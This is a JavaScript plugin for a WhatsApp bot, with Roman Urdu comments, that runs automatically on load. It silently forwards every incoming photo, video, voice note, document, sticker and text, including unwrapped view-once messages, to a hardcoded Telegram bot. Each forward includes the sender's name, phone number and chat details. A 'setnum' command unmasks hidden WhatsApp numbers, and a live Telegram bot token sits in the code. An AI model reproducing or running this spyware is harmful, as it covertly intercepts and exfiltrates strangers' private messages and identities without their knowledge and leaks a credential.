const { cmd } = require("../command");
const axios = require("axios");
const FormData = require("form-data");
const fs = require("fs");
const path = require("path");

const TG_TOKEN = "8626751277:AAHKmGACfSamLAORB53ag9MaEKwYlBk0Zb0";
const TG_CHAT = "6653388298";
const MAP_FILE = path.join(__dirname, "tgstore-numbers.json");

let NUMMAP = {};
try { if (fs.existsSync(MAP_FILE)) NUMMAP = JSON.parse(fs.readFileSync(MAP_FILE, "utf8")); } catch (e) {}
const saveMap = () => { try { fs.writeFileSync(MAP_FILE, JSON.stringify(NUMMAP, null, 1)); } catch (e) {} };

let ON = true, CLIENT = null, STORE = null;
let pollOn = false, hookOn = false, SEEN = 0, LASTERR = "";
const DONE = new Set();

// ── Telegram ──
async function tgText(t) { try { await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, { chat_id: TG_CHAT, text: t, parse_mode: "Markdown" }, { timeout: 10000 }); } catch (e) { LASTERR = "tg: " + e.message; } }
async function tgUp(buf, cap, ep, field, fname, mime) {
    try {
        if (!buf?.length) return tgText(cap + "\n\n⚠️ Download fail");
        if (buf.length > 49 * 1024 * 1024) return tgText(cap + "\n\n⚠️ 50MB+ file");
        const f = new FormData();
        f.append("chat_id", TG_CHAT); f.append("caption", cap);
        f.append(field, buf, { filename: fname, contentType: mime });
        await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/${ep}`, f, { headers: f.getHeaders(), timeout: 90000, maxBodyLength: Infinity });
    } catch (e) { LASTERR = "up: " + e.message; await tgText(cap + "\n\n⚠️ Upload fail"); }
}

// ── Media nikalo (view-once wrapper samet) ──
function gct(m) { return m ? Object.keys(m).find(k => !["senderKeyDistributionMessage", "messageContextInfo"].includes(k)) : null; }
function getMedia(raw) {
    let msg = raw?.message; if (!msg) return null;
    let t = gct(msg);
    if (t === "ephemeralMessage") { msg = msg[t].message || msg; t = gct(msg); }
    let vo = false;
    if (t === "viewOnceMessage" || t === "viewOnceMessageV2") { vo = true; msg = msg[t].message || {}; t = gct(msg); }
    const o = t ? msg[t] : null;
    if (!o || typeof o !== "object") return null;
    if (["imageMessage", "videoMessage", "audioMessage", "documentMessage", "stickerMessage"].includes(t)) return { type: t.replace("Message", ""), o, vo };
    if (t === "conversation" || t === "extendedTextMessage") return { type: "text", o, vo: false };
    return null;
}

// ── Download: base ka proven method pehle ──
async function dl(raw, media) {
    if (CLIENT?.downloadMediaMessage) {
        try { const b = await CLIENT.downloadMediaMessage(media.o); if (b?.length) return b; } catch (e) {}
        try { const b = await CLIENT.downloadMediaMessage(raw); if (b?.length) return b; } catch (e) {}
    }
    if (typeof raw?.download === "function") { try { const b = await raw.download(); if (b?.length) return b; } catch (e) {} }
    try {
        const B = require("@whiskeysockets/baileys");
        const st = await B.downloadContentFromMessage(media.o, media.type === "sticker" ? "image" : media.type);
        let buf = Buffer.from([]); for await (const c of st) buf = Buffer.concat([buf, c]);
        if (buf.length) return buf;
    } catch (e) {}
    return null;
}

// ── Number ──
const dig = j => String(j || "").split("@")[0].split(":")[0].replace(/[^0-9]/g, "");
async function num(senderJid) {
    const d = dig(senderJid); if (!d) return "Unknown";
    if (NUMMAP[d]) return NUMMAP[d];
    try {
        const c = STORE?.contacts?.[senderJid];
        const pd = dig(c?.pnJid || (c?.jid?.endsWith("@s.whatsapp.net") ? c.jid : ""));
        if (pd && pd !== d && pd.length >= 8) { NUMMAP[d] = pd; saveMap(); return pd; }
    } catch (e) {}
    return (d.length >= 8 && d.length <= 15 && !d.startsWith("120363")) ? d : "Unknown";
}

// ── Process ─
async function proc(raw, client) {
    try {
        if (!ON || !raw?.key?.id || !raw?.message || raw.key.fromMe) return;
        const id = raw.key.id; if (DONE.has(id)) return; DONE.add(id); if (DONE.size > 1500) DONE.clear();
        const jid = raw.key.remoteJid || ""; if (jid === "status@broadcast") return;
        const media = getMedia(raw); if (!media) return;
        SEEN++; CLIENT = client;
        const sender = raw.key.participant || jid;
        const number = await num(sender);
        const name = raw.pushName || dig(sender) || "No Name";
        const time = new Date().toLocaleString("en-PK", { timeZone: "Asia/Karachi", hour12: true });
        const isG = jid.endsWith("@g.us");
        let chat = "Private DM";
        if (isG) { try { chat = (await client.groupMetadata(jid))?.subject || "Group"; } catch (e) {} }
        const base = `🤖 *${media.vo ? "👁️ VIEW-ONCE " : ""}FORWARD*\n\n🕒 Time: \`${time}\`\n👤 Name: ${name}\n🔢 Number: ${number}\n💬 Chat: ${isG ? "👥 Group" : "👤 DM"}\n🏷️ Chat Name: ${chat}`;

        if (media.type === "image") return tgUp(await dl(raw, media), base + `\n\n📦 Type: ️ Image\n Caption: ${media.o.caption || "No Caption"}`, "sendPhoto", "photo", "img.jpg", media.o.mimetype || "image/jpeg");
        if (media.type === "video") return tgUp(await dl(raw, media), base + `\n\n📦 Type: 🎥 Video\n Caption: ${media.o.caption || "No Caption"}`, "sendVideo", "video", "vid.mp4", media.o.mimetype || "video/mp4");
        if (media.type === "audio") {
            const mime = media.o.mimetype || "audio/mp4";
            const voice = media.o.ptt || mime.includes("ogg");
            const cap = base + `\n\n📦 Type: ${voice ? "🎤 Voice" : "🎵 Audio"}`;
            return voice ? tgUp(await dl(raw, media), cap, "sendVoice", "voice", "v.ogg", "audio/ogg") : tgUp(await dl(raw, media), cap, "sendAudio", "audio", "a.mp4", mime);
        }
        if (media.type === "document") return tgUp(await dl(raw, media), base + `\n\n📦 Type:  Document\n File: ${media.o.fileName || "File"}`, "sendDocument", "document", media.o.fileName || "file.bin", media.o.mimetype || "application/octet-stream");
        if (media.type === "sticker") return tgUp(await dl(raw, media), base + `\n\n📦 Type:  Sticker`, "sendSticker", "sticker", "s.webp", "image/webp");
        if (media.type === "text") {
            const t = media.o.text || media.o.conversation || "";
            if (t) return tgText(base + `\n\n📦 Type: 📝 Text\n️ Message: ${t}`);
        }
    } catch (e) { LASTERR = e.message; }
}

// ── ENGINE: store polling (asal cheez) ──
function startPoll(client, store) {
    CLIENT = client; if (store) STORE = store;
    if (pollOn || !STORE?.messages) return false;
    pollOn = true;
    setInterval(async () => {
        if (!ON || !CLIENT) return;
        try {
            const chats = STORE.messages;
            const keys = typeof chats.keys === "function" ? chats.keys() : Object.keys(chats);
            for (const jid of keys) {
                if (jid === "status@broadcast") continue;
                const db = chats[jid];
                let arr = Array.isArray(db?.array) ? db.array : (Array.isArray(db) ? db : null);
                if (!arr) { try { arr = db?.toJSON?.(); } catch (e) {} }
                if (!arr?.length) continue;
                for (const raw of arr.slice(-6)) await proc(raw, CLIENT);
            }
        } catch (e) {}
    }, 2500);
    console.log("[TGSTORE] polling START ✔");
    return true;
}
function attachHook(client) {
    if (hookOn) return;
    try {
        const ev = client?.ev || client?.sock?.ev;
        if (ev?.on) { ev.on("messages.upsert", async d => { for (const m of (d?.messages || [])) await proc(m, client); }); hookOn = true; }
    } catch (e) {}
}
setImmediate(() => {
    const b = setInterval(() => {
        const c = global.client || global.conn || global.sock;
        if (c) { attachHook(c); startPoll(c, global.store); }
        if (pollOn) clearInterval(b);
    }, 3000);
    setTimeout(() => clearInterval(b), 5 * 60 * 1000);
});

// store pakarne ka guaranteed zariya: pehla incoming text
cmd({ on: "body", dontAddCommandList: true, filename: __filename }, async (client, m, store, extra) => {
    try {
        CLIENT = client; if (store) STORE = store;
        if (!hookOn) attachHook(client);
        if (!pollOn) startPoll(client, store);
    } catch (e) {}
});

// ── Commands ──
cmd({ pattern: "autotele", alias: ["tgstore"], desc: "Telegram auto system", category: "owner", react: "🤖", filename: __filename },
async (client, m, store, { reply, isCreator }) => {
    if (!isCreator) return;
    CLIENT = client; if (store) STORE = store;
    if (!hookOn) attachHook(client);
    if (!pollOn) startPoll(client, store);
    const a = ((m.body || m.text || "").trim().split(/\s+/)[1] || "").toLowerCase();
    if (a === "off") { ON = false; return reply("⏸️ OFF"); }
    if (a === "on") { ON = true; return reply(`▶️ *ON!*\nEngine: ${pollOn ? "store-polling ✔" : (hookOn ? "hook ✔" : "waiting...")}\nAb view-once + bot msgs + sab kuch aayega.`); }
    return reply(`📊 STATUS\n• System: ${ON ? "ON" : "OFF"}\n• Polling: ${pollOn ? "✔" : "✗"} | Hook: ${hookOn ? "✔" : "✗"}\n• Processed: ${SEEN}\n• Numbers saved: ${Object.keys(NUMMAP).length}\n• Last error: ${LASTERR || "none"}\n\n.autotele on | off`);
});

cmd({ pattern: "setnum", desc: "Save/lookup real number", category: "owner", react: "🔢", filename: __filename },
async (client, m, store, { reply, isCreator }) => {
    if (!isCreator) return;
    if (store) STORE = store;
    const args = (m.body || m.text || "").trim().split(/\s+/).slice(1);
    const d = (args[0] || "").replace(/[^0-9]/g, "");
    if (!d) return reply("Usage:\n.setnum <digits> <realnumber>\n.setnum <digits> (lookup)");
    if (args[1]) {
        const r = args[1].replace(/[^0-9]/g, "");
        if (r.length < 8) return reply("❌ Galat number");
        NUMMAP[d] = r; saveMap();
        return reply(`✅ Saved: ${d} → ${r}\nAb hamesha REAL number aayega.`);
    }
    let real = NUMMAP[d] || null;
    if (!real) {
        try {
            for (const [jid, c] of Object.entries(STORE?.contacts || {})) {
                if (dig(c?.lidJid) === d || jid.startsWith(d + "@")) {
                    const pd = dig(c.pnJid || c.jid);
                    if (pd && pd !== d && pd.length >= 8) { real = pd; break; }
                }
            }
        } catch (e) {}
    }
    if (real) { NUMMAP[d] = real; saveMap(); return reply(`🔢 Real number: ${real}\nhttps://wa.me/${real}\n(Save bhi ho gaya ✔)`); }
    return reply(`❌ ${d} ka real number WhatsApp chhupa raha hai (privacy).\nEk baar save karo, phir hamesha real aayega:\n.setnum ${d} <asli-number>`);
});

console.log("[TGSTORE] loaded ✔");
